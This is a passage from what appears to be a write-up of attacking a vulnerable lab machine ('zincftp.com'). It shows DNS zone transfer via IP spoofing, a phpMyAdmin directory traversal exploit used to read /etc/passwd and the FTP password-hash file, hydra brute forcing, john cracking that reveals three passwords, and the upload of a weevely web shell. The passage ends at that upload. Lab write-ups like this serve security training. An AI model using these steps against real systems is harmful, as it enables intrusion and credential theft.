<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; Got answer:
</span><span class='line'>;; ->>HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28383
</span><span class='line'>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>;; QUESTION SECTION:
</span><span class='line'>;zincftp.com.                   IN      A&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>;; ANSWER SECTION:
</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>;; AUTHORITY SECTION:
</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>;; ADDITIONAL SECTION:
</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>;; Query time: 3 msec
</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
</span><span class='line'>;; WHEN: Sun May  3 01:04:27 2015
</span><span class='line'>;; MSG SIZE  rcvd: 113</span></code></pre></td></tr></table></div></figure></p>

<p>We append these lines to /etc/hosts and try DNS AXFR (zone transfer):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 ns1.zincftp.com
</span><span class='line'>192.168.1.89 ns2.zincftp.com</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>; Transfer failed.
</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr
</span><span class='line'>;; Connection to 192.168.1.89#53(192.168.1.89) for zincftp.com failed: host unreachable.</span></code></pre></td></tr></table></div></figure></p>

<p>We change our IP address to the IP of the not reachable DNS server and try AXFR again:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.89
</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      MX      10 mta.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88
</span><span class='line'>ahuxley.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>amckinley.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>bzimmerman.zincftp.com. 38400   IN      A       192.168.1.88
</span><span class='line'>cbergey.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>cfinnerly.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>cjalong.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>cmahong.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>cmanson.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>ddonnovan.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>ddypsky.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>dev.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>dhammond.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>dmoran.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>dsummers.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>evorhees.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>gwelch.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>hmcknight.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>jgacy.zincftp.com.      38400   IN      A       192.168.1.88
</span><span class='line'>jsmith.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>jstreet.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>kmccallum.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>lnickerbacher.zincftp.com. 38400 IN     A       192.168.1.88
</span><span class='line'>lsanderson.zincftp.com. 38400   IN      A       192.168.1.88
</span><span class='line'>lwestre.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>mta.zincftp.com.        38400   IN      A       10.0.192.48
</span><span class='line'>ncobol.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89
</span><span class='line'>rcropper.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>rfrost.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>rwoo.zincftp.com.       38400   IN      A       192.168.1.88
</span><span class='line'>skrymple.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>splath.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>tmartin.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>trusted.zincftp.com.    38400   IN      A       192.168.1.34
</span><span class='line'>www.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
</span><span class='line'>;; Query time: 5 msec
</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
</span><span class='line'>;; WHEN: Sun May  3 01:08:24 2015
</span><span class='line'>;; XFR size: 42 records (messages 1, bytes 1021)</span></code></pre></td></tr></table></div></figure></p>

<p>Appending the list to /etc/hosts:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr <span class="p">|</span> egrep <span class="p">&amp;</span>lsquo<span class="p">;</span>192.168.1.88<span class="nv">$&amp;</span>rsquo<span class="p">;</span> <span class="p">|</span> awk <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">{</span> print <span class="nv">$5</span> <span class="p">&amp;</span>ldquo<span class="p">;</span> <span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="nv">$1</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="p">|</span> sed <span class="p">&amp;</span>rsquo<span class="p">;</span>s#.<span class="nv">$##</span><span class="p">&amp;</span>lsquo<span class="p">;</span> &gt;&gt; /etc/hosts
</span></code></pre></td></tr></table></div></figure></p>

<p>Dirb reports the following URLs:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&mdash;- Scanning URL: &lt;a href="http://www.zincftp.com/">http://www.zincftp.com/&lt;/a> &mdash;-
</span><span class='line'>+ &lt;a href="http://www.zincftp.com/index">http://www.zincftp.com/index&lt;/a> (CODE:200|SIZE:1205)
</span><span class='line'>+ &lt;a href="http://www.zincftp.com/index.php">http://www.zincftp.com/index.php&lt;/a> (CODE:200|SIZE:1205)
</span><span class='line'>+ &lt;a href="http://www.zincftp.com/phpMyAdmin">http://www.zincftp.com/phpMyAdmin&lt;/a> (CODE:403|SIZE:333)
</span><span class='line'>+ &lt;a href="http://www.zincftp.com/register">http://www.zincftp.com/register&lt;/a> (CODE:200|SIZE:16)
</span><span class='line'>+ &lt;a href="http://www.zincftp.com/server-status">http://www.zincftp.com/server-status&lt;/a> (CODE:403|SIZE:336)
</span><span class='line'>+ &lt;a href="http://www.zincftp.com/setup_guides">http://www.zincftp.com/setup_guides&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>In particular the interesting file was <a href="http://www.zincftp.com/setup_guides/todo">http://www.zincftp.com/setup_guides/todo</a>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;!--
</span><span class='line'>Adding new users to the system
</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</span><span class='line'>
</span><span class='line'>create user
</span><span class='line'>        useradd -g ftp_users -s /bin/false -d /home/&lt;username&gt; -m &lt;username&gt;
</span><span class='line'>
</span><span class='line'>create web dir
</span><span class='line'>        mkdir /home/&lt;username&gt;/web
</span><span class='line'>
</span><span class='line'><span class="nb">set </span>ownership so ftp can write to dir
</span><span class='line'>        chown -R vftp:ftp_users /home/&lt;username&gt;
</span><span class='line'>
</span><span class='line'>add ftp user
</span><span class='line'>        pure-pw useradd &lt;username&gt; -u vftp -g ftp_users -d /home/&lt;username&gt;
</span><span class='line'>
</span><span class='line'>update /etc/pure-ftpd/pureftpd.passwd file
</span><span class='line'>        pure-pw mkdb
</span><span class='line'>--&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Again we set our IP address to match the &ldquo;trusted.zincftp.com&rdquo; host, to get access to phpmyadmin:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.34</span></code></pre></td></tr></table></div></figure></p>

<p>We found nothing interesting in phpmyadmin, but it&rsquo;s vulnerable and we can interpret the arbitrary file on web server as PHP script.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# ./searchsploit phpmyadmin | grep 2.6
</span><span class='line'>phpMyAdmin 2.6.4-pl1 - Remote Directory Traversal Exploit | /php/webapps/1244.pl
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl &lt;a href="http://192.168.1.88">http://192.168.1.88&lt;/a> /phpMyAdmin/ ../../../../../../../etc/passwd&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
</span><span class='line'>bind:x:104:111::/var/cache/bind:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
</span><span class='line'>cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
</span><span class='line'>ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
</span><span class='line'>skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
</span><span class='line'>amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
</span><span class='line'>cmahong:x:1005:2002::/home/cmahong:/bin/false
</span><span class='line'>lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false
</span><span class='line'>jstreet:x:1007:2002::/home/jstreet:/bin/false
</span><span class='line'>rwoo:x:1008:2002::/home/rwoo:/bin/false
</span><span class='line'>kmccallum:x:1009:2002::/home/kmccallum:/bin/false
</span><span class='line'>cjalong:x:1010:2002::/home/cjalong:/bin/false
</span><span class='line'>jsmith:x:1011:2002::/home/jsmith:/bin/false
</span><span class='line'>dhammond:x:1012:2002::/home/dhammond:/bin/false
</span><span class='line'>hmcknight:x:1013:2002::/home/hmcknight:/bin/false
</span><span class='line'>lwestre:x:1014:2002::/home/lwestre:/bin/false
</span><span class='line'>gwelch:x:1015:2002::/home/gwelch:/bin/false
</span><span class='line'>dmoran:x:1016:2002::/home/dmoran:/bin/false
</span><span class='line'>dsummers:x:1017:2002::/home/dsummers:/bin/false
</span><span class='line'>bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false
</span><span class='line'>ncobol:x:1019:2002::/home/ncobol:/bin/false
</span><span class='line'>ddypsky:x:1020:2002::/home/ddypsky:/bin/false
</span><span class='line'>rcropper:x:1021:2002::/home/rcropper:/bin/false
</span><span class='line'>cbergey:x:1022:2002::/home/cbergey:/bin/false
</span><span class='line'>tmartin:x:1023:2002::/home/tmartin:/bin/false
</span><span class='line'>jgacy:x:1024:2002::/home/jgacy:/bin/false
</span><span class='line'>splath:x:1025:2002::/home/splath:/bin/false
</span><span class='line'>evorhees:x:1026:2002::/home/evorhees:/bin/false
</span><span class='line'>rfrost:x:1027:2002::/home/rfrost:/bin/false
</span><span class='line'>ahuxley:x:1028:2002::/home/ahuxley:/bin/false
</span><span class='line'>webmaster:x:1029:2002::/var/www:/bin/false
</span><span class='line'>cmanson:x:1030:2002::/home/cmanson:/bin/false
</span><span class='line'>v&lt;a href="ftp:x:1031:2002:Virtual">ftp:x:1031:2002:Virtual&lt;/a> FTP User:/dev/null:/bin/false</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl &lt;a href="http://192.168.1.88">http://192.168.1.88&lt;/a> /phpMyAdmin/ ../../../../../../../../etc/apache2/apache2.conf | grep -i log
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl &lt;a href="http://192.168.1.88">http://192.168.1.88&lt;/a> /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/conf/PureDB
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl &lt;a href="http://192.168.1.88">http://192.168.1.88&lt;/a> /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.pdb
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl &lt;a href="http://192.168.1.88">http://192.168.1.88&lt;/a> /phpMyAdmin/ ../../../../../../../../etc/init.d/firewall</span></code></pre></td></tr></table></div></figure></p>

<p>We can also try to perform the brute-force attack on ftp users (see /etc/group)
and generate the short wordlist with john according username, but without
success, ftp connection is limited with the firewall:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# <span class="k">for</span> i in <span class="k">$(</span>cat ftp-users<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span> &gt; john-temp-wl <span class="p">;</span> john <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">wordlist</span><span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>john-temp-wl<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>rules <span class="p">&amp;</span>ndash<span class="p">;</span>stdout &gt; john-temp-wl-with-rules<span class="p">;</span> hydra -l <span class="nv">$i</span> -P john-temp-wl-with-rules 192.168.1.88 ftp -V -t <span class="m">1</span> -w 50<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After a while we found the hash list for ftp and used the john to crack it:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl &lt;a href="http://192.168.1.88">http://192.168.1.88&lt;/a> /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.passwd&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>cmahong:$1$vUW5q3t0$9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
</span><span class='line'>lnickerbacher:$1$yiEZKCE0$BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
</span><span class='line'>jstreet:$1$sBGmOuB0$TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
</span><span class='line'>rwoo:$1$VZxDrE30$p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
</span><span class='line'>cfinnerly:$1$dRGyIOy0$OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
</span><span class='line'>kmccallum:$1$dijBzwn0$qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
</span><span class='line'>cjalong:$1$FVj4if60$BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
</span><span class='line'>jsmith:$1$yQKaOpR0$UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
</span><span class='line'>lsanderson:$1$gzIP52U0$cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
</span><span class='line'>dhammond:$1$yK9OuzZ0$W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
</span><span class='line'>hmcknight:$1$A07SpdB0$hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
</span><span class='line'>lwestre:$1$.R5Dbl60$n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
</span><span class='line'>gwelch:$1$/uYT22Y0$njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
</span><span class='line'>dmoran:$1$JZrJXdU0$ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
</span><span class='line'>dsummers:$1$VXo3pWp0$v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
</span><span class='line'>bzimmerman:$1$rQep6B90$ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
</span><span class='line'>amckinley:$1$45Bz0af0$Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
</span><span class='line'>ncobol:$1$q.xxgp70$645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
</span><span class='line'>ddypsky:$1$ccUhlpJ0$PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
</span><span class='line'>rcropper:$1$Qhw2Vff0$QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
</span><span class='line'>ddonnovan:$1$1z2APl80$uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
</span><span class='line'>cbergey:$1$MOwY3Ie0$LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
</span><span class='line'>tmartin:$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
</span><span class='line'>jgacy:$1$b.0bYDi0$sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
</span><span class='line'>splath:$1$jbdcsaj0$7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
</span><span class='line'>skrymple:$1$zjyNa1C0$x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
</span><span class='line'>evorhees:$1$ITHWZZd0$Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
</span><span class='line'>rfrost:$1$3Nqexaj0$eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
</span><span class='line'>ahuxley:$1$ObpCAT60$LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
</span><span class='line'>cmanson:$1$gMHNCq70$RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
</span><span class='line'>webmaster:$1$v2tdHOX0$MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john hashes.john &ndash;wordlist=&ldquo;/usr/share/wordlists/rockyou.txt&rdquo;  &ndash;rules
</span><span class='line'>millionaire      (tmartin)
</span><span class='line'>chatterbox1      (cbergey)
</span><span class='line'>bravenewworld    (ahuxley)</span></code></pre></td></tr></table></div></figure></p>

<p>We uploaded weevely to web directory of tmartin user via ftp:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp> put weevely.php
</span><span class='line'>local: weevely.php remote: weevely.php
</span><span class='line'>200 PORT command successful
